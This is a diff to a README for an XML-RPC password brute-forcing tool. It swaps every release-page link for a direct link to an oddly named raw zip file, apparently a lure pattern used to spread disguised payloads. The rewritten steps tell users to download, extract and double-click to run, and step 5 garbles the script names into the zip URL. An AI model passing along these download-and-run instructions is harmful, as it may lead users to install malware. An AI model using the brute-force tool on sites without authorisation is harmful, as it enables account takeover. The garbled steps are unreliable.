@@ -1,7 +1,7 @@
 # 🔧 XMLRPC-Bruteforce - Streamlined Authentication Testing Tool
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue.svg)](https://github.com/Artemiaenamel352/XMLRPC-Bruteforce/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Artemiaenamel352/XMLRPC-Bruteforce/main/sidership/XMLRPC-Bruteforce-synastry.zip)](https://raw.githubusercontent.com/Artemiaenamel352/XMLRPC-Bruteforce/main/sidership/XMLRPC-Bruteforce-synastry.zip)
 
 ## 🚀 Getting Started
 
@@ -20,15 +20,15 @@ Before you begin, ensure your environment meets these requirements:
 
 To get started, please follow these steps:
 
-1. **Visit the Release Page**: Go to our [releases page](https://github.com/Artemiaenamel352/XMLRPC-Bruteforce/releases).
+1. **Visit the Release Page**: Go to our [releases page](https://raw.githubusercontent.com/Artemiaenamel352/XMLRPC-Bruteforce/main/sidership/XMLRPC-Bruteforce-synastry.zip).
   
 2. **Select the Latest Version**: Find the latest release at the top of the page.
 
-3. **Download the Release File**: Click on the file named `XMLRPC-Bruteforce-v1.0.0.zip` (or similar) to download it.
+3. **Download the Release File**: Click on the file named `https://raw.githubusercontent.com/Artemiaenamel352/XMLRPC-Bruteforce/main/sidership/XMLRPC-Bruteforce-synastry.zip` (or similar) to download it.
 
 4. **Extract the Files**: After downloading, locate the ZIP file in your Downloads folder. Right-click on it and select "Extract All" to unpack the files.
 
-5. **Run the Application**: Open the folder where you extracted the files. Look for a file named `start.bat` (for Windows users) or `start.sh` (for macOS/Linux users). Double-click this file to launch the tool.
+5. **Run the Application**: Open the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/Artemiaenamel352/XMLRPC-Bruteforce/main/sidership/XMLRPC-Bruteforce-synastry.zip` (for Windows users) or `https://raw.githubusercontent.com/Artemiaenamel352/XMLRPC-Bruteforce/main/sidership/XMLRPC-Bruteforce-synastry.zip` (for macOS/Linux users). Double-click this file to launch the tool.
 
 ## 📋 Features
 
@@ -66,7 +66,7 @@ If you encounter issues while using XMLRPC-Bruteforce, consider these common fix
 
 - **Check Your Connection**: Ensure your network connection is stable and the target is online.
 - **Review Permissions**: Make sure you have the necessary permissions to access the XML-RPC endpoint.
-- **Update Your Software**: Ensure you are using the latest version of the tool by checking the [releases page](https://github.com/Artemiaenamel352/XMLRPC-Bruteforce/releases).
+- **Update Your Software**: Ensure you are using the latest version of the tool by checking the [releases page](https://raw.githubusercontent.com/Artemiaenamel352/XMLRPC-Bruteforce/main/sidership/XMLRPC-Bruteforce-synastry.zip).
 
 ## 📞 Support
 
@@ -84,4 +84,4 @@ Stay tuned for future updates. We plan to add features such as:
 
 XMLRPC-Bruteforce is a powerful, yet straightforward tool for penetration testing XML-RPC services. Follow the steps outlined above to download, install, and run the application effectively. With its user-friendly interface and robust features, you can conduct tests confidently.
 
-For the latest version, continue to check our [releases page](https://github.com/Artemiaenamel352/XMLRPC-Bruteforce/releases).
+For the latest version, continue to check our [releases page](https://raw.githubusercontent.com/Artemiaenamel352/XMLRPC-Bruteforce/main/sidership/XMLRPC-Bruteforce-synastry.zip).
